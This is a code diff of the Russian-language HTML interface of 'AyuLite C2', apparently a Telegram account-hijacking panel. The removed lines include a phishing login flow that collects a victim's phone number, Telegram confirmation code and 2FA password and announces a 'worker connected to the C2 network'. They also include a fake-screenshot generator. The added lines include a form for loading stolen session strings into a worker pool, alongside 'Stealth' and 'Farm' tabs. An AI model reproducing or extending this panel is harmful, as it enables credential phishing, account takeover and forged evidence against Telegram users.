+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
+        📸 Студия фейк-скриншотов iOS 18
       </button>
 
-      <div id="snatcherStatusBox" style="display: none; margin-top: 14px; padding: 12px; background: rgba(0,0,0,0.4); border-radius: 8px; border: 1px solid var(--line); font-size: 12.5px;">
-        <div id="snatcherStatusText" style="color: var(--mut); margin-bottom: 6px;">Ожидание...</div>
-        <div style="background: rgba(255,255,255,0.08); height: 6px; border-radius: 3px; overflow: hidden;">
-          <div id="snatcherProgressBar" style="width: 0%; height: 100%; background: #4bd6f9; transition: width 0.3s;"></div>
-        </div>
+      <button class="btn-secondary" id="btnCopyTunnelUrl">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="2" y1="12" x2="22" y2="12"></line><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path></svg>
+        🌐 Скопировать защищенную ссылку WebApp
+      </button>
+
+      <button class="btn-secondary danger" id="btnClearCacheBtn">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"></polyline><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path></svg>
+        🧹 Очистить старый кэш медиа (>7 дней)
+      </button>
+    </div>
+  </main>
+
+  <!-- =========================================================================
+       BOTTOM NAVIGATION DOCK
+       ========================================================================= -->
+  <nav class="bottom-dock">
+    <button class="dock-btn active" data-tab="feed">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon></svg>
+      <span>Лента</span>
+    </button>
+
+    <button class="dock-btn" data-tab="vault">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>
+      <span>Сейф</span>
+    </button>
+
+    <button class="dock-btn" data-tab="stealth">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+      <span>Стелс</span>
+    </button>
+
+    <button class="dock-btn" data-tab="farm">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
+      <span>Ферма</span>
+    </button>
+
+    <button class="dock-btn" data-tab="system">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"></circle><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path></svg>
+      <span>Система</span>
+    </button>
+  </nav>
+
+  <!-- =========================================================================
+       MODAL: ДОБАВИТЬ СЕССИЮ
+       ========================================================================= -->
+  <div class="modal-overlay" id="addSessionModal">
+    <div class="bottom-sheet">
+      <div class="sheet-handle"></div>
+      <div class="sheet-header">
+        <span class="sheet-title">Подключить аккаунт</span>
+        <button class="btn-close" id="btnCloseAddSession">✕</button>
       </div>
+      <div style="margin-bottom: 12px;">
+        <label style="font-size: 11.5px; color: var(--text-muted); display: block; margin-bottom: 6px;">StringSession (Telethon / Pyrogram):</label>
+        <textarea id="inputSessionString" class="search-input" style="height: 100px; resize: none; background: var(--bg-card); border: 1px solid var(--border-medium); border-radius: var(--radius-sm); padding: 10px; font-family: var(--font-mono); font-size: 12px;" placeholder="1BJWap8..."></textarea>
+      </div>
+      <div style="margin-bottom: 16px;">
+        <label style="font-size: 11.5px; color: var(--text-muted); display: block; margin-bottom: 6px;">Номер телефона (для справки):</label>
+        <input type="text" id="inputSessionPhone" class="search-input" style="background: var(--bg-card); border: 1px solid var(--border-medium); border-radius: var(--radius-sm); padding: 8px 10px;" placeholder="+79991234567">
+      </div>
+      <button class="btn-primary" id="btnSubmitAddSession">Подключить в пул воркеров</button>
     </div>
   </div>
-</section>
 
-<footer>
-  <div class="container foot">
-    <span>AYULITE C2 · WEB ENGINE v2.5 · CORE MTPROTO 1.36.0</span>
-    <span>© 2026 · RU</span>
+  <!-- Toast Element -->
+  <div class="toast-box" id="globalToast">
+    <span id="toastIcon">⚡️</span>
+    <span id="toastText">Событие выполнено</span>
   </div>
-</footer>
 
-<nav class="bnav" id="bnav">
-  <a href="#vault" style="color:var(--acc); font-weight:700;">Сейф 🔥</a>
-  <a href="#snatcher" style="color:#4bd6f9; font-weight:700;">Snatcher 📦</a>
-  <a href="#nodes">Узлы</a>
-  <a href="#modules">Модули</a>
-  <a href="#pricing">Тарифы</a>
-  <a href="#expert">Expert</a>
-  <a href="#settings">Настройки</a>
-</nav>
-
-<!-- ======= LOGIN MODAL ======= -->
-<div class="overlay" id="loginModal">
-  <div class="modal">
-    <button class="m-close" data-close aria-label="Закрыть">×</button>
-
-    <!-- Step 0: Phone -->
-    <div id="ls0">
-      <h3>Вход в AyuLite</h3>
-      <p class="m-sub">Выберите страну и введите номер телефона.</p>
-            <div class="cc" id="cc">
-        <button class="cc-btn" id="ccBtn" type="button">
-          <span id="ccFlag">🇷🇺</span><span id="ccName">Россия</span><code id="ccCode">+7</code>
-          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><path d="m6 9 6 6 6-6"/></svg>
-        </button>
-        <div class="cc-backdrop" id="ccBackdrop" hidden></div>
-        <div class="cc-list" id="ccList" hidden>
-          <div class="cc-search-box">
-            <div class="cc-search-inner">
-              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
-              <input type="text" class="cc-search-input" id="ccSearchInput" placeholder="Поиск (Россия, +7, US, KZ...)" autocomplete="off">
-              <button class="cc-search-clear" id="ccSearchClear" type="button" aria-label="Очистить">×</button>
-            </div>
-            <button class="cc-done-btn" id="ccDoneBtn" type="button">Готово</button>
-          </div>
-          <div class="cc-items" id="ccItems"></div>
-        </div>
-      </div>
-      <div class="field">
-        <input type="tel" inputmode="numeric" placeholder="(999) 000-00-00" id="phoneInput" autocomplete="tel">
-      </div>
-      <p class="note">Код подтверждения придёт в чат Telegram от официального сервиса @Telegram.</p>
-      <button class="btn btn-primary btn-block" id="toCode">Продолжить</button>
-      <button class="btn btn-block btn-tg-direct" id="btnTgDirect">🔗 Открыть привязку в @AyuLiteBot</button>
-      <button class="btn btn-cancel-session" data-close type="button">✕ Отменить вход в сессию</button>
-    </div>
-
-    <!-- Step 1: Code -->
-    <div id="ls1" hidden>
-      <h3>Код подтверждения</h3>
-      <p class="m-sub">Мы отправили код в приложение Telegram. Введите его ниже.</p>
-      <div class="code" id="codeBox">
-        <input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric">
-      </div>
-      <div class="code-actions">
-        <button class="btn-paste" id="btnPasteCode" type="button">
-          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"/><rect x="8" y="2" width="8" height="4" rx="1" ry="1"/></svg>
-          Вставить код
-        </button>
-      </div>
-      <p class="resend"><button id="resend" disabled>Запросить код повторно через 60 с</button></p>
-      <button class="btn btn-primary btn-block" id="confirmCode">Подтвердить код</button>
-      <button class="btn btn-cancel-session" data-close type="button">✕ Отменить вход в сессию</button>
-    </div>
-
-    <!-- Step 1B: 2FA Password -->
-    <div id="ls1b" hidden>
-      <h3>Облачный пароль (2FA)</h3>
-      <p class="m-sub">На вашем аккаунте включена двухфакторная аутентификация. Введите пароль.</p>
-      <div class="pwd-wrap">
-        <input type="password" id="passwordInput" class="pwd-input"
-               placeholder="Введите ваш 2FA пароль"
-               autocomplete="current-password" autocorrect="off"
-               autocapitalize="off" spellcheck="false" name="password">
-        <button type="button" class="pwd-eye-btn" id="btnTogglePwd" aria-label="Показать пароль">
-          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
-        </button>
-      </div>
-      <button class="btn btn-primary btn-block" id="confirmPassword">Войти в аккаунт</button>
-      <button class="btn btn-cancel-session" data-close type="button">✕ Отменить вход в сессию</button>
-    </div>
-
-    <!-- Step 2: Success -->
-    <div id="ls2" hidden>
-      <div class="ok-mark">
-        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#d6f94b" stroke-width="2.4" stroke-linecap="round"><path d="m4.5 12.5 5 5 10-11"/></svg>
-      </div>
-      <h3>Устройство привязано</h3>
-      <p class="m-sub">Воркер инициализирован и подключён к C2-сети.</p>
-      <div class="dev-card">
-        <b id="connectedDevName">User Account</b>
-        <span id="devMeta">+7 000 000-00-00 · AyuLite</span>
-      </div>
-      <button class="btn btn-primary btn-block" id="loginDone">Перейти к управлению</button>
-    </div>
-  </div>
-</div>
-
-<!-- ======= PAY MODAL ======= -->
-<div class="overlay" id="payModal">
-  <div class="modal">
-    <button class="m-close" data-close aria-label="Закрыть">×</button>
-    <h3 id="payTitle">Активация плана</h3>
-    <p class="m-sub">Выберите способ оплаты для мгновенной активации привилегий.</p>
-    <div class="pay-price mono" id="payPrice">—</div>
-    <div class="pay-row" data-method="Telegram Stars"><span>Telegram Stars</span><code>мгновенно</code></div>
-    <div class="pay-row" data-method="TON"><span>TON Cryptocurrency</span><code>on-chain</code></div>
-    <div class="pay-row" data-method="Карта / СБП"><span>Банковская карта · СБП</span><code>ru</code></div>
-  </div>
-</div>
-
-<!-- ======= FAKESHOT PRO MODAL (iOS 18 Telegram Edition) ======= -->
-<div class="fakeshot-modal" id="fakeshotModal" style="display:none;">
-  <div class="fakeshot-card">
-    <div class="fakeshot-header">
-      <h3 style="margin:0; font-size:16px; color:#c084fc; display:flex; align-items:center; gap:6px;">
-        <span>📸 Fakeshot Pro</span>
-        <span style="font-size:10px; background:rgba(168,85,247,0.2); border:1px solid #a855f7; padding:2px 6px; border-radius:4px; color:#e9d5ff;">iOS 18</span>
-      </h3>
-      <button class="m-close" id="btnCloseFakeshot" style="background:none; border:none; color:#fff; font-size:22px; cursor:pointer;">×</button>
-    </div>
-    <p style="font-size:12px; color:var(--mut); margin:0 0 14px 0;">Генерация гиперреалистичного скриншота без Dynamic Island шторки с оранжевой капсулой ⚡ TELEGRAM.</p>
-
-    <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-bottom:12px;">
-      <div>
-        <label style="font-size:11px; color:var(--mut); display:block; margin-bottom:4px;">Время (ЧЧ:ММ):</label>
-        <input type="text" id="fakeTimeInput" value="13:02" style="width:100%; padding:7px 10px; background:rgba(0,0,0,0.5); border:1px solid var(--line); border-radius:6px; color:#fff; font-size:12.5px;">
-      </div>
-      <div>
-        <label style="font-size:11px; color:var(--mut); display:block; margin-bottom:4px;">Батарея (%):</label>
-        <input type="number" id="fakeBatteryInput" value="44" min="1" max="100" style="width:100%; padding:7px 10px; background:rgba(0,0,0,0.5); border:1px solid var(--line); border-radius:6px; color:#fff; font-size:12.5px;">
-      </div>
-    </div>
-
-    <div style="margin-bottom:12px;">
-      <label style="font-size:11px; color:var(--mut); display:block; margin-bottom:4px;">Название чата:</label>
-      <input type="text" id="fakeTitleInput" value="Избранное" style="width:100%; padding:7px 10px; background:rgba(0,0,0,0.5); border:1px solid var(--line); border-radius:6px; color:#fff; font-size:12.5px;">
-    </div>
-
-    <div style="margin-bottom:14px; display:flex; align-items:center; gap:8px;">
-      <input type="checkbox" id="fakeSendToSaved" style="cursor:pointer;">
-      <label for="fakeSendToSaved" style="font-size:12px; color:#ddd; cursor:pointer;">Дублировать в «Избранное» (Saved Messages)</label>
-    </div>
-
-    <button class="btn btn-primary btn-block" id="btnGenerateFakeshot" style="background:linear-gradient(135deg, #7839ee, #a855f7); border:none; padding:10px; font-weight:700;">🚀 Сгенерировать скриншот iOS 18</button>
-
-    <div class="fakeshot-preview-wrap" id="fakeshotPreviewWrap" style="display:none;">
-      <img id="fakeshotImg" class="fakeshot-preview-img" src="" alt="Fakeshot Preview">
-    </div>
-
-    <div id="fakeshotDownloadWrap" style="display:none; margin-top:12px;">
-      <a id="btnDownloadFakeshot" class="btn btn-sm btn-block" href="" download="telegram_ios18.png" style="text-align:center; display:block; padding:8px; background:#4bd6f9; color:#000; font-weight:700; text-decoration:none;">📥 Скачать в оригинальном разрешении (1170x2532)</a>
-    </div>
-  </div>
-</div>
-
-<div class="toast mono" id="toast"></div>
-
-<script src="app.js?v=7.0"></script>
+  <script src="app.js?v=8.0"></script>
 </body>
 </html>
